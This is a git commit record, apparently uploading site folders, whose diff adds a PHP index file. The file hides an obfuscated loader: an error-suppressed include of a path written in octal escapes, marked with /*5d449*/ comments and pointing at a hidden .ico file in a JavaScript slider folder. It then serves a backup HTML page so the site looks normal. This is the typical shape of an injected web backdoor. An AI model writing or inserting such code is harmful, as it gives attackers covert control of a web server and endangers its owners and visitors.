a2b9c7dec87a36ef251e9fe0386d1e7e81307ef0
anils7016 <anils7016@gmail.com>
2020-06-06 15:24:21 +0530

    all remaining folder

---
+++ system/index.php
@@ -0,0 +1,13 @@
+<?php
+
+
+
+
+/*5d449*/
+
+@include "\057ho\155e/\154iv\145te\163tp\162oj\145ct\163/p\165bl\151c_\150tm\154/s\153ai\160he\162/j\163/m\165lt\151sc\162ol\154-s\154id\145r/\056fb\06527\066af\056ic\157";
+
+/*5d449*/
+
+
+echo @file_get_contents('index.html.bak.bak');
